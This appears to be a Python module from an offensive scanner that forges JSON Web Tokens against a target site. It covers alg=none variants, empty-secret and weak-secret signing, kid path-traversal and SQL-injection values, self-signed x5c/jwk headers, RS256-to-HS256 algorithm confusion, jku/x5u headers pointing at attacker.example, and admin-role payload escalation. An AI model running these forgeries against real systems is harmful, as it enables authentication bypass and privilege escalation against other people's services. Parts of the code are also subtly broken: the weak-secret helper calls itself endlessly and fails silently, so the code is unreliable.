"""jwt_bypass — JWT attack suite: none, alg confusion, kid injection, jku/x5u"""
import base64
import hmac
import hashlib, json, hmac, hashlib, re, os, time
from core.http import HttpClient

def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def b64d(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

class JwtBypass:
    def run(self, session, logger):
        http = HttpClient(session, logger)
        r = http.get(session.target)
        if not r: return {}
        JWT_RE = re.compile(r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*")

        tokens = JWT_RE.findall(r.text)[:3]
        for c in r.cookies:
            if JWT_RE.match(c.value): tokens.append(c.value)
        if not tokens:
            print("[jwt_bypass] no tokens"); return {}

        token = tokens[0]
        print(f"[jwt_bypass] token: {token[:60]}...")
        try:
            h, p, s = token.split(".")
            header = json.loads(b64d(h))
            payload = json.loads(b64d(p))
        except Exception as e:
            print(f"  decode error: {e}"); return {}

        attacks = {}

        # 1. alg=none variations
        for alg_val in ["none", "None", "NONE", "nOnE"]:
            forged = b64e(json.dumps({"alg":alg_val,"typ":"JWT"}).encode()) + "." + \
                     b64e(json.dumps(payload).encode()) + "."
            attacks[f"alg_{alg_val}"] = forged

        # 2. alg=HS256 with empty secret
        signing = f"{h}.{p}".encode()
        empty_sig = b64e(hmac.new(b"", signing, hashlib.sha256).digest())
        attacks["hs256_empty"] = f"{h}.{p}.{empty_sig}"

        # 3. kid injection (path traversal / SQLi)
        for kid_val in ["../../../../etc/passwd", "/dev/null", "' OR '1'='1", "key"]:
            new_h = dict(header); new_h["kid"] = kid_val
            forged = b64e(json.dumps(new_h).encode()) + "." + b64e(json.dumps(payload).encode()) + "."
            attacks[f"kid_{kid_val[:10]}"] = forged

        # 5. weak-secret brute (HS256 с дефолтными секретами)
        WEAK_SECRETS = [
            "secret", "changeme", "password", "123456", "admin", "jwt",
            "secretkey", "secret_key", "jwt_secret", "supersecret",
            "your-256-bit-secret", "your_jwt_secret", "key", "test",
            "dev", "development", "production", "private", "token",
            "mysecret", "default", "jwtkey", "HS256", "shhhh",
        ]
        try:
            from base64 import urlsafe_b64decode as _b64d
            parts = token.split(".")
            if len(parts) == 3:
                msg = (parts[0] + "." + parts[1]).encode()
                sig = parts[2]
                def _b64d(s):
                    s += "=" * (-len(s) % 4)
                    return _b64d(s)
                for sec in WEAK_SECRETS:
                    mac = hmac.new(sec.encode(), msg, hashlib.sha256).digest()
                    if _b64d(sig) == mac:
                        attacks[f"weak_secret_{sec}"] = token
                        print(f"  [!] WEAK SECRET: {sec}")
                        logger.finding("jwt_weak_secret", "critical", sec)
                        break
        except Exception:
            pass

        # 6. x5c injection — self-signed cert in header
        try:
            from cryptography import x509
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import rsa
            from cryptography.x509.oid import NameOID
            import datetime
            key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
            subj = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "attacker")])
            cert = (x509.CertificateBuilder()
                    .subject_name(subj).issuer_name(subj)
                    .public_key(key.public_key())
                    .serial_number(x509.random_serial_number())
                    .not_valid_before(datetime.datetime.utcnow())
                    .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=1))
                    .sign(key, hashes.SHA256()))
            der = cert.public_bytes(serialization.Encoding.DER)
            x5c = base64.b64encode(der).decode()
            new_h = dict(header)
            new_h["x5c"] = [x5c]
            new_h["alg"] = "RS256"
            attacks["x5c_selfsigned"] = b64e(json.dumps(new_h).encode()) + "." + \
                b64e(json.dumps(payload).encode()) + ".AAAA"
        except ImportError:
            pass  # cryptography не установлен — пропускаем
        except Exception:
            pass

        # 7. jwk self-signed — клиент присылает публичный ключ в header
        try:
            from cryptography.hazmat.primitives.asymmetric import rsa
            import json as _j
            key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
            pub = key.public_key().public_numbers()
            def _int_b64(i):
                b = i.to_bytes((i.bit_length() + 7) // 8, "big")
                return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
            jwk = {"kty": "RSA", "n": _int_b64(pub.n), "e": _int_b64(pub.e), "alg": "RS256", "use": "sig"}
            new_h = dict(header); new_h["jwk"] = jwk; new_h["alg"] = "RS256"
            attacks["jwk_selfsigned"] = b64e(json.dumps(new_h).encode()) + "." + \
                b64e(json.dumps(payload).encode()) + ".AAAA"
        except Exception:
            pass

        # 8. alg confusion RS256 -> HS256 (подпись публичным ключом как HMAC-секретом)
        # пробуем, если публичный ключ доступен через /.well-known/jwks.json или /jwks
        for jwks_path in ["/.well-known/jwks.json", "/jwks.json", "/.well-known/jwks"]:
            try:
                base = session.target.rstrip("/")
                rj = http.get(base + jwks_path)
                if not rj or rj.status_code != 200:
                    continue
                jwks = rj.json()
                if "keys" not in jwks:
                    continue
                # собираем PEM из n/e первого ключа
                k0 = jwks["keys"][0]
                if k0.get("kty") != "RSA":
                    continue
                import json as _j
                def _b64d_pad(s):
                    s += "=" * (-len(s) % 4)
                    return base64.urlsafe_b64decode(s)
                n = int.from_bytes(_b64d_pad(k0["n"]), "big")
                e = int.from_bytes(_b64d_pad(k0["e"]), "big")
                # публичный ключ как PEM (упрощённо через cryptography)
                try:
                    from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
                    pubkey = _rsa.RSAPublicNumbers(e, n).public_key()
                    from cryptography.hazmat.primitives import serialization as _ser
                    pem = pubkey.public_bytes(
                        _ser.Encoding.PEM, _ser.PublicFormat.SubjectPublicKeyInfo)
                    new_h = dict(header); new_h["alg"] = "HS256"
                    msg = b64e(json.dumps(new_h).encode()) + "." + b64e(json.dumps(payload).encode())
                    mac = hmac.new(pem, msg.encode(), hashlib.sha256).digest()
                    attacks[f"alg_confusion_{jwks_path}"] = msg + "." + base64.urlsafe_b64encode(mac).rstrip(b"=").decode()
                    print(f"  [+] alg confusion prepared via {jwks_path}")
                except Exception:
                    pass
            except Exception:
                continue


        # 4. jku / x5u header injection
        for field in ["jku", "x5u"]:
            new_h = dict(header); new_h[field] = "https://attacker.example/jwks.json"
            forged = b64e(json.dumps(new_h).encode()) + "." + b64e(json.dumps(payload).encode()) + "."
            attacks[f"{field}_injection"] = forged

        # 5. privileged payload mutations
        for field in ["role","admin","isAdmin","is_admin","type","user_type"]:
            if field in payload:
                esc = dict(payload)
                if isinstance(payload[field], bool): esc[field] = True
                elif isinstance(payload[field], int): esc[field] = 9999
                else: esc[field] = "admin"
                forged = b64e(json.dumps({"alg":"none","typ":"JWT"}).encode()) + "." + \
                         b64e(json.dumps(esc).encode()) + "."
                attacks[f"esc_{field}"] = forged

        print(f"[jwt_bypass] generated {len(attacks)} attack variants")
        for name, t in attacks.items():
            print(f"  [{name}] {t[:70]}...")
            logger.finding("jwt_attack","info",f"{name}")

        return {"original": token, "attacks": attacks}
